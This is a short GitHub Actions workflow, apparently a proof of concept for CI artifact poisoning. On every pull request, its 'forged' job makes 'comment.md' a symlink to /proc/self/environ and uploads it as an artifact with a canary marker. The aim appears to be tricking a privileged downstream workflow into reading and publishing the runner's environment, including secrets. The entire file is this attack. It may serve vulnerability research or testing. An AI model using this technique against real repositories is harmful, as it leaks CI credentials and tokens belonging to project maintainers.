name: Publish

on:
  pull_request:
    branches: [ main ]
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft symlink artifact
        run: |
          mkdir -p output
          ln -sfn /proc/self/environ output/comment.md
          ls -la output
          echo "PRIVILEGED_READ_CANARY" > output/marker.txt
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: output
          path: output/
